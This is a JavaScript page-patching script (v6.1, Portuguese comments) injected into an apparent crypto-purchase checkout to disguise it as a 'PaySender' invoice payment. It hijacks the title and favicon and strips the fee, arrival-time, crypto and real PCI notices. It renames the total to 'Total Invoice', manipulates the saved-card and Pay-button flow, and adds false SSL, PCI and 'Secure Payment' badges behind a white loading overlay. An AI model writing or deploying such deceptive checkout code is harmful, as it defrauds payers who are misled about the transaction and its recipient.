(function () {
  /* ═══════════════════════════════════════════════════════════
     PAGE PATCHER v6.1 — Paysender
     + Favicon persistente (bloqueia reversão do Next.js)
     + Título persistente "PaySender - Payments Made Easy"
  ═══════════════════════════════════════════════════════════ */

  const overlay = document.createElement('div');
  overlay.style.cssText =
    'position:fixed;top:0;left:0;width:100vw;height:100vh;' +
    'background:#fff;z-index:2147483647;pointer-events:none;';
  document.documentElement.appendChild(overlay);

  const rm    = el => el && el.parentNode && el.parentNode.removeChild(el);
  const added = new Set();

  const state = {
    savedCardDetected  : false,
    initialFingerprints: new Set(),
    initialDigits      : new Set(),
    payHidden          : false,
    addCardClicked     : false,
    syntheticInjected  : false,
  };

  /* ══════════════════════════════════════════════════════════
     FAVICON + TÍTULO PERSISTENTES
     O Next.js actualiza <title> e <link rel="icon"> via JS.
     Solução: interceptar document.title com Object.defineProperty
     + MutationObserver no <head> para apanhar qualquer
     reescrita do favicon e reverter imediatamente.
  ══════════════════════════════════════════════════════════ */
  const PS_TITLE   = 'PaySender - Payments Made Easy';
  const PS_FAVICON = 'https://raw.githubusercontent.com/SiteHosterBabe/teste/refs/heads/main/logogateaway.png';

  /* ── Intercepta document.title ── */
  (function trapTitle() {
    let _title = document.title;
    try {
      Object.defineProperty(document, 'title', {
        get() { return _title; },
        set(v) {
          /* Ignora qualquer tentativa de mudar para o título original */
          _title = PS_TITLE;
          /* Actualiza o elemento <title> directamente */
          const t = document.querySelector('title');
          if (t) t.textContent = PS_TITLE;
        },
        configurable: true,
      });
    } catch (_) {
      /* Fallback: se defineProperty falhar, força via interval */
    }
    /* Força o título imediatamente */
    document.title = PS_TITLE;
  })();

  /* ── Cria e bloqueia o elemento favicon ── */
  let _faviconEl = null;

  function buildFaviconEl() {
    const link = document.createElement('link');
    link.id   = '__ps_favicon__';
    link.rel  = 'icon';
    link.type = 'image/png';
    /* Congela o href com defineProperty para que ninguém o possa mudar */
    Object.defineProperty(link, 'href', {
      get() { return PS_FAVICON; },
      set() { /* bloqueado */ },
      configurable: false,
    });
    /* Também bloqueia setAttribute para rel e href */
    const _origSetAttr = link.setAttribute.bind(link);
    link.setAttribute = function(name, value) {
      if (name === 'href') return; /* bloqueia alteração do href */
      _origSetAttr(name, value);
    };
    _faviconEl = link;
    return link;
  }

  function applyFavicon() {
    const head = document.head;
    if (!head) return;

    /* Remove qualquer favicon que não seja o nosso */
    head.querySelectorAll('link[rel*="icon"]').forEach(l => {
      if (l.id !== '__ps_favicon__') l.parentNode && l.parentNode.removeChild(l);
    });

    /* Garante que o nosso está no DOM */
    if (!document.getElementById('__ps_favicon__')) {
      if (!_faviconEl) buildFaviconEl();
      head.appendChild(_faviconEl);
    }

    /* Garante título */
    const t = document.querySelector('title');
    if (t && t.textContent !== PS_TITLE) t.textContent = PS_TITLE;
  }

  /* ── Intercepta appendChild/insertBefore no head para bloquear favicons externos ── */
  (function interceptHeadMutations() {
    const head = document.head;
    if (!head) return;

    const _appendChild    = head.appendChild.bind(head);
    const _insertBefore   = head.insertBefore.bind(head);
    const _replaceChild   = head.replaceChild.bind(head);

    function isForeignFavicon(node) {
      return node.nodeType === 1 &&
             node.tagName === 'LINK' &&
             (node.rel || '').toLowerCase().includes('icon') &&
             node.id !== '__ps_favicon__';
    }

    head.appendChild = function(node) {
      if (isForeignFavicon(node)) { applyFavicon(); return node; }
      return _appendChild(node);
    };
    head.insertBefore = function(node, ref) {
      if (isForeignFavicon(node)) { applyFavicon(); return node; }
      return _insertBefore(node, ref);
    };
    head.replaceChild = function(newNode, oldNode) {
      if (isForeignFavicon(newNode)) { applyFavicon(); return newNode; }
      return _replaceChild(newNode, oldNode);
    };
  })();

  /* ── MutationObserver no <head> como camada extra ── */
  function installHeadObserver() {
    const head = document.head;
    if (!head) return;
    new MutationObserver(mutations => {
      let needsApply = false;
      mutations.forEach(m => {
        m.addedNodes.forEach(n => {
          if (n.nodeType === 1 && n.tagName === 'LINK' &&
              (n.rel||'').toLowerCase().includes('icon') &&
              n.id !== '__ps_favicon__') {
            n.parentNode && n.parentNode.removeChild(n);
            needsApply = true;
          }
        });
        /* Detecta mudança de characterData no título */
        if (m.target && m.target.tagName === 'TITLE') needsApply = true;
      });
      if (needsApply) applyFavicon();
    }).observe(head, { childList: true, subtree: true, characterData: true });
  }

  /* ── Instala tudo assim que o head existir ── */
  if (document.head) {
    buildFaviconEl();
    applyFavicon();
    installHeadObserver();
  } else {
    new MutationObserver((_, obs) => {
      if (document.head) {
        obs.disconnect();
        buildFaviconEl();
        applyFavicon();
        installHeadObserver();
      }
    }).observe(document.documentElement, { childList: true });
  }

  /* ── Interval de segurança (apanha edge cases do Firefox) ── */
  setInterval(applyFavicon, 300);

  /* ══════════════════════════════════════════════════════════
     HELPERS (cartões)
  ══════════════════════════════════════════════════════════ */
  function cardFingerprint(el) {
    const m = el.textContent.match(/\*+\s*(\d{4})/);
    const digits = m ? m[1] : String(Date.now());
    const img  = el.querySelector('img[alt]');
    const type = img ? (img.getAttribute('alt') || '').toLowerCase() : '';
    return { fp: `${type}-${digits}`, digits };
  }

  function isCardBlock(el) {
    return (
      el.classList.contains('bg-Comp-ContainerBg') &&
      el.classList.contains('rounded-xl') &&
      (el.querySelector('img[alt]') || el.textContent.includes('****'))
    );
  }

  function detectCardType(number) {
    const n = number.replace(/\D/g, '');
    if (/^4/.test(n))                      return 'visa';
    if (/^(5[1-5]|2[2-7])/.test(n))       return 'mastercard';
    if (/^3[47]/.test(n))                  return 'amex';
    if (/^(6011|622|64[4-9]|65)/.test(n)) return 'discover';
    return 'visa';
  }

  function getImgBase() {
    const sample = document.querySelector('img[src*="visaCard"], img[src*="masterCard"]');
    if (sample) return sample.src.substring(0, sample.src.lastIndexOf('/') + 1);
    return '';
  }

  function cardImages(type) {
    const base = getImgBase();
    const map = {
      visa      : { light: 'visaCard.d9984578.svg',   dark: 'visaCardDark.2e64b77e.svg' },
      mastercard: { light: 'masterCard.ac35cf18.svg', dark: 'masterCard.ac35cf18.svg'   },
      amex      : { light: 'visaCard.d9984578.svg',   dark: 'visaCardDark.2e64b77e.svg' },
      discover  : { light: 'visaCard.d9984578.svg',   dark: 'visaCardDark.2e64b77e.svg' },
    };
    const imgs = map[type] || map.visa;
    return { light: base + imgs.light, dark: base + imgs.dark };
  }

  function cardLabel(type) {
    return { visa:'Visa', mastercard:'MasterCard', amex:'Amex', discover:'Discover' }[type] || 'Card';
  }

  function hidePayButton(root) {
    if (state.payHidden) return;
    root.querySelectorAll('button').forEach(btn => {
      const span = btn.querySelector('span');
      if (span && span.textContent.trim() === 'Pay' && !btn.hasAttribute('data-ps-pay')) {
        btn.setAttribute('data-ps-pay', '1');
        btn.style.setProperty('display', 'none', 'important');
        state.payHidden = true;
      }
    });
  }

  function showPayButton() {
    document.querySelectorAll('button[data-ps-pay]').forEach(btn => {
      btn.style.removeProperty('display');
      btn.removeAttribute('data-ps-pay');
    });
    state.payHidden = false;
  }

  function findCardContainer() {
    const panels = document.querySelectorAll('div.border.border-line.rounded-lg');
    for (const panel of panels) {
      if (!panel.textContent.includes('Credit or Debit Card')) continue;
      const px5 = panel.querySelector('div.px-5');
      if (px5) return px5;
    }
    return null;
  }

  function hideAddCardButton() {
    document.querySelectorAll('div.cursor-pointer.text-Text-TextLink').forEach(el => {
      if (el.textContent.trim() === 'Add Card')
        el.style.setProperty('display', 'none', 'important');
    });
  }

  function injectSyntheticCard(digits, cardType) {
    const old = document.getElementById('__ps_synthetic_card__');
    if (old) rm(old);
    const container = findCardContainer();
    if (!container) return;
    const imgs  = cardImages(cardType);
    const label = cardLabel(cardType);
    const card = document.createElement('div');
    card.id            = '__ps_synthetic_card__';
    card.className     = 'cursor-pointer mt-4 rounded-xl p-3 bg-Comp-ContainerBg flex items-center justify-between gap-2.5 transition-all duration-300';
    card.style.cssText = 'pointer-events:none;cursor:default;';
    card.innerHTML = `
      <div class="w-8 h-8">
        <img alt="${cardType}" loading="lazy" width="24" height="24" decoding="async"
          class="block dark:hidden shrink-0 w-8 h-8" style="color:transparent;" src="${imgs.light}">
        <img alt="${cardType}" loading="lazy" width="24" height="24" decoding="async"
          class="hidden dark:block shrink-0 w-8 h-8" style="color:transparent;" src="${imgs.dark}">
      </div>
      <div class="flex flex-1 justify-between items-center">
        <div class="flex flex-col gap-1">
          <div class="text-body-s text-Text-SecondaryText">Paying With</div>
          <div class="flex justify-between items-center">
            <div class="flex gap-1 items-center">${label} (**** ${digits})</div>
          </div>
        </div>
      </div>`;
    container.appendChild(card);
    state.syntheticInjected = true;
  }

  /* ══════════════════════════════════════════════════════════
     LÓGICA CARTÕES INICIAIS
  ══════════════════════════════════════════════════════════ */
  function handleInitialSavedCards(root) {
    if (state.addCardClicked) return;
    root.querySelectorAll('div.bg-Comp-ContainerBg').forEach(card => {
      if (!isCardBlock(card)) return;
      if (card.id === '__ps_synthetic_card__') return;
      const { fp, digits } = cardFingerprint(card);
      if (state.initialFingerprints.has(fp)) return;
      state.savedCardDetected = true;
      state.initialFingerprints.add(fp);
      state.initialDigits.add(digits);
      hidePayButton(root);
      rm(card);
    });
  }

  const disabledCards = new WeakSet();
  function disableSavedCardClicks(root) {
    root.querySelectorAll('div.bg-Comp-ContainerBg').forEach(card => {
      if (!isCardBlock(card)) return;
      if (card.id === '__ps_synthetic_card__') return;
      if (disabledCards.has(card)) return;
      disabledCards.add(card);
      card.style.pointerEvents = 'none';
      card.style.cursor        = 'default';
      card.querySelectorAll('svg[alt="ICGoInactive"]').forEach(svg => rm(svg));
    });
  }

  const listenedAddCards = new WeakSet();
  const listenedConfirms = new WeakSet();

  function listenForAddCard() {
    document.querySelectorAll('div.cursor-pointer.text-Text-TextLink').forEach(el => {
      if (el.textContent.trim() !== 'Add Card') return;
      if (listenedAddCards.has(el)) return;
      listenedAddCards.add(el);
      el.addEventListener('click', () => { state.addCardClicked = true; });
    });
  }

  function getModalCardNumber() {
    const inputs = document.querySelectorAll(
      'input[placeholder="Enter card number"], input[maxlength="19"]'
    );
    for (const inp of inputs) {
      const raw = (inp.value || '').replace(/\D/g, '');
      if (raw.length >= 4) return raw;
    }
    return null;
  }

  function onConfirmClick() {
    if (!state.savedCardDetected) return;
    if (!state.payHidden) return;
    const fullNumber = getModalCardNumber();
    if (!fullNumber || fullNumber.length < 4) return;
    const digits   = fullNumber.slice(-4);
    const cardType = detectCardType(fullNumber);
    if (state.initialDigits.has(digits)) return;
    state.addCardClicked    = false;
    state.syntheticInjected = false;
    setTimeout(() => {
      injectSyntheticCard(digits, cardType);
      showPayButton();
      hideAddCardButton();
    }, 600);
  }

  function listenForConfirm() {
    document.querySelectorAll('button').forEach(btn => {
      if (btn.textContent.trim() !== 'Confirm') return;
      if (listenedConfirms.has(btn)) return;
      listenedConfirms.add(btn);
      btn.addEventListener('click', onConfirmClick);
    });
  }

  /* ══════════════════════════════════════════════════════════
     DECORAÇÕES
  ══════════════════════════════════════════════════════════ */
  function addDecorations() {
    if (!added.has('header') && document.body) {
      const bar = document.createElement('div');
      bar.id = '__ps_header__';
      bar.style.cssText = 'width:100%;padding:14px 32px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f5f5f5;background:#fff;position:relative;z-index:100;box-sizing:border-box;';
      bar.innerHTML = `
        <div style="display:flex;align-items:center;gap:10px;">
          <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect width="32" height="32" rx="8" fill="#F5C842"/>
            <path d="M9 10h8a5 5 0 0 1 0 10h-4v5H9V10z" fill="#1a1a1a"/>
            <rect x="13" y="14" width="4" height="2" rx="1" fill="#F5C842"/>
          </svg>
          <span style="font-size:18px;font-weight:700;color:#1a1a1a;letter-spacing:-0.3px;">Pay<span style="color:#F5C842;">sender</span></span>
        </div>
        <div style="display:flex;align-items:center;gap:6px;font-size:12px;color:#999;font-weight:500;">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
          Secure Payment
        </div>`;
      document.body.insertBefore(bar, document.body.firstChild);
      added.add('header');
    }
    if (!added.has('blob-tl')&&document.body){const b=document.createElement('div');b.id='__ps_blob_tl__';b.style.cssText='position:fixed;top:-180px;left:-180px;width:560px;height:560px;border-radius:50%;pointer-events:none;z-index:0;background:radial-gradient(circle,rgba(245,200,66,0.13) 0%,transparent 68%);';document.body.appendChild(b);added.add('blob-tl');}
    if (!added.has('blob-br')&&document.body){const b=document.createElement('div');b.id='__ps_blob_br__';b.style.cssText='position:fixed;bottom:-160px;right:-140px;width:500px;height:500px;border-radius:50%;pointer-events:none;z-index:0;background:radial-gradient(circle,rgba(245,200,66,0.11) 0%,transparent 68%);';document.body.appendChild(b);added.add('blob-br');}
    if (!added.has('blob-tr')&&document.body){const b=document.createElement('div');b.id='__ps_blob_tr__';b.style.cssText='position:fixed;top:60px;right:-100px;width:320px;height:320px;border-radius:50%;pointer-events:none;z-index:0;background:radial-gradient(circle,rgba(245,200,66,0.08) 0%,transparent 70%);';document.body.appendChild(b);added.add('blob-tr');}
    if (!added.has('dots-tr')&&document.body){const d=document.createElement('div');d.id='__ps_dots_tr__';d.style.cssText='position:fixed;top:72px;right:24px;pointer-events:none;z-index:1;opacity:0.55;';d.innerHTML=`<svg width="112" height="112" viewBox="0 0 112 112" fill="none" xmlns="http://www.w3.org/2000/svg">${Array.from({length:7},(_,r)=>Array.from({length:7},(_,c)=>`<circle cx="${c*16+8}" cy="${r*16+8}" r="2" fill="#F5C842" opacity="${0.4+((r+c)%3)*0.2}"/>`).join('')).join('')}</svg>`;document.body.appendChild(d);added.add('dots-tr');}
    if (!added.has('dots-bl')&&document.body){const d=document.createElement('div');d.id='__ps_dots_bl__';d.style.cssText='position:fixed;bottom:48px;left:24px;pointer-events:none;z-index:1;opacity:0.45;';d.innerHTML=`<svg width="96" height="96" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">${Array.from({length:6},(_,r)=>Array.from({length:6},(_,c)=>`<circle cx="${c*16+8}" cy="${r*16+8}" r="2" fill="#F5C842" opacity="${0.3+((r+c)%3)*0.25}"/>`).join('')).join('')}</svg>`;document.body.appendChild(d);added.add('dots-bl');}
    if (!added.has('dots-br')&&document.body){const d=document.createElement('div');d.id='__ps_dots_br__';d.style.cssText='position:fixed;bottom:48px;right:24px;pointer-events:none;z-index:1;opacity:0.35;';d.innerHTML=`<svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">${Array.from({length:4},(_,r)=>Array.from({length:4},(_,c)=>`<circle cx="${c*16+8}" cy="${r*16+8}" r="1.8" fill="#F5C842"/>`).join('')).join('')}</svg>`;document.body.appendChild(d);added.add('dots-br');}
    if (!added.has('left-line')&&document.body){const l=document.createElement('div');l.id='__ps_lline__';l.style.cssText='position:fixed;left:0;top:0;bottom:0;width:3px;pointer-events:none;z-index:1;background:linear-gradient(180deg,transparent 0%,#F5C842 30%,#f0903a 70%,transparent 100%);opacity:0.45;';document.body.appendChild(l);added.add('left-line');}
    if (!added.has('ring')&&document.body){const r=document.createElement('div');r.id='__ps_ring__';r.style.cssText='position:fixed;left:-60px;top:50%;transform:translateY(-50%);pointer-events:none;z-index:0;opacity:0.07;';r.innerHTML=`<svg width="220" height="220" viewBox="0 0 220 220" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="110" cy="110" r="100" stroke="#F5C842" stroke-width="18"/><circle cx="110" cy="110" r="70" stroke="#F5C842" stroke-width="10"/><circle cx="110" cy="110" r="42" stroke="#F5C842" stroke-width="6"/></svg>`;document.body.appendChild(r);added.add('ring');}
    if (!added.has('ssl-badge')) {
      document.querySelectorAll('button').forEach(btn => {
        const span = btn.querySelector('span');
        if (span && span.textContent.trim() === 'Pay' && !btn.parentNode.querySelector('.__ps_ssl__')) {
          const badge = document.createElement('div');
          badge.className = '__ps_ssl__';
          badge.style.cssText = 'display:flex;align-items:center;justify-content:center;gap:5px;margin-top:10px;font-size:11.5px;color:#aaa;font-weight:500;';
          badge.innerHTML = `<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>256-bit SSL encrypted · Powered by&nbsp;<strong style="color:#1a1a1a;">Paysender</strong>`;
          btn.insertAdjacentElement('afterend', badge);
          added.add('ssl-badge');
        }
      });
    }
    if (!added.has('footer')&&document.body){const f=document.createElement('div');f.id='__ps_footer__';f.style.cssText='position:fixed;bottom:0;left:0;right:0;padding:10px 32px;font-size:11px;color:#bbb;border-top:1px solid #f0f0f0;background:rgba(255,255,255,0.92);backdrop-filter:blur(6px);box-sizing:border-box;z-index:99;display:flex;align-items:center;justify-content:center;gap:18px;flex-wrap:wrap;';f.innerHTML=`<span>© 2025 <strong style="color:#1a1a1a;">Paysender</strong>. All rights reserved.</span><span style="display:flex;align-items:center;gap:4px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>PCI DSS Compliant</span><span style="cursor:pointer;">Privacy Policy</span><span style="cursor:pointer;">Terms of Service</span>`;document.body.appendChild(f);added.add('footer');}
  }

  /* ══════════════════════════════════════════════════════════
     MODIFICAÇÕES BASE
  ══════════════════════════════════════════════════════════ */
  function removeNameOnCard(root){for(const el of root.querySelectorAll('div')){if(el.classList.contains('py-3')&&el.classList.contains('text-body-xs')&&el.textContent.includes('Your name on card must be')){rm(el);return;}}}
  function removeAddCard(root){if(state.savedCardDetected)return;for(const el of root.querySelectorAll('div.cursor-pointer')){if(el.classList.contains('text-Text-TextLink')&&el.textContent.trim()==='Add Card'){rm(el);return;}}}
  function removeAutoFill(){rm(document.getElementById('fill'));}
  function removeFloatingIcon(root){for(const el of root.querySelectorAll('div.absolute')){if(el.classList.contains('bottom-6')&&el.classList.contains('right-6')){rm(el);return;}}}
  function removeMobileHeadphones(root){root.querySelectorAll('svg.cursor-pointer').forEach(svg=>{if(svg.classList.contains('fill-current')&&svg.classList.contains('text-Text-PrimaryText')&&svg.classList.contains('sm:hidden')){rm(svg);}});}
  function removeCryptoSvg(root){for(const el of root.querySelectorAll('svg.fill-current')){if(el.classList.contains('text-Comp-ContainerBg')){rm(el);return;}}}
  function removeLtcBlock(root){for(const el of root.querySelectorAll('div')){if(el.classList.contains('flex')&&el.classList.contains('w-full')&&el.classList.contains('gap-2')&&el.classList.contains('px-0')){rm(el);return;}}}
  function removeFeesRow(root){for(const el of root.querySelectorAll('div.w-full.flex.justify-between')){const l=el.querySelector('div.text-body-m.text-Text-PrimaryText');if(l&&l.textContent.trim()==='Fees'){rm(el);return;}}}
  function removeArrivalTimeRow(root){for(const el of root.querySelectorAll('div.w-full.flex.justify-between')){const l=el.querySelector('div.text-body-m.text-Text-PrimaryText');if(l&&l.textContent.trim()==='Arrival Time'){rm(el);return;}}}
  function renameTotalSpend(root){for(const el of root.querySelectorAll('div.w-full.flex.justify-between')){const l=el.querySelector('div.text-body-m.text-Text-PrimaryText');if(l&&l.textContent.trim()==='Total Spend'){l.textContent='Total Invoice';return;}}}
  function removePciBlock(root){root.querySelectorAll('div').forEach(el=>{if(el.classList.contains('flex')&&el.classList.contains('flex-col')&&el.classList.contains('mb-4')&&el.classList.contains('w-full')&&el.classList.contains('items-center')&&el.classList.contains('justify-center')&&el.textContent.includes('PCI')&&el.textContent.includes('Compliant')){rm(el);}});}

  const BASE_MODS=[removeNameOnCard,removeAddCard,removeAutoFill,removeFloatingIcon,removeMobileHeadphones,removeCryptoSvg,removeLtcBlock,removeFeesRow,removeArrivalTimeRow,renameTotalSpend,removePciBlock];

  /* ══════════════════════════════════════════════════════════
     APPLY ALL
  ══════════════════════════════════════════════════════════ */
  function applyAll() {
    const root = document.body || document.documentElement;
    try { handleInitialSavedCards(root); } catch(_){}
    try { disableSavedCardClicks(root); } catch(_){}
    try { listenForAddCard(); } catch(_){}
    try { listenForConfirm(); } catch(_){}
    BASE_MODS.forEach(fn => { try { fn(root); } catch(_){} });
    try { addDecorations(); } catch(_){}
  }

  new MutationObserver(applyAll).observe(document.documentElement,{childList:true,subtree:true});
  applyAll();
  const ticker = setInterval(applyAll, 100);

  function reveal() {
    applyAll();
    overlay.style.transition = 'opacity 0.3s ease';
    overlay.style.opacity = '0';
    setTimeout(() => rm(overlay), 320);
  }

  if (document.readyState==='complete'||document.readyState==='interactive') {
    setTimeout(reveal, 600);
  } else {
    window.addEventListener('load', ()=>setTimeout(reveal,600));
  }

  setTimeout(()=>rm(overlay), 5000);
  setTimeout(()=>clearInterval(ticker), 30000);

  console.log('%c[Paysender v6.1] ✓ Favicon + Título + tudo aplicado.','color:#1a1a1a;font-weight:bold;font-size:13px;background:#F5C842;padding:4px 10px;border-radius:4px;');
})();